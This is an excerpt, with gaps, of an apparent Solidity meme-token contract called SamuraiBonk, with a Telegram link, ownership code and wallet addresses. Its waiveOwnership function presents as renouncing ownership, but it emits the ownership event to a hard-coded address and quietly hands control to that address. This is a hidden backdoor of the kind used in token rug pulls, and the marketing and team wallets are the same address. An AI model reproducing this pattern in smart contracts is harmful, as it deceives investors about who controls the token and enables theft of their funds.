...
/**
 *  Telegram: https://t.me/SamuraiBonk
 **/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3A2ee5A8AB001543202Ead59aAADD959905FD788));
        _owner = address(0x3A2ee5A8AB001543202Ead59aAADD959905FD788);
    }
...
contract SamuraiBonk is Context, IERC20, Ownable {
    ...
    string private _symbol = "Samurai-Bonk";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xC9fba9625519746b8dF0E4aE051a5b8d1d8Df995);
    address payable public teamWalletAddress = payable(0xC9fba9625519746b8dF0E4aE051a5b8d1d8Df995);
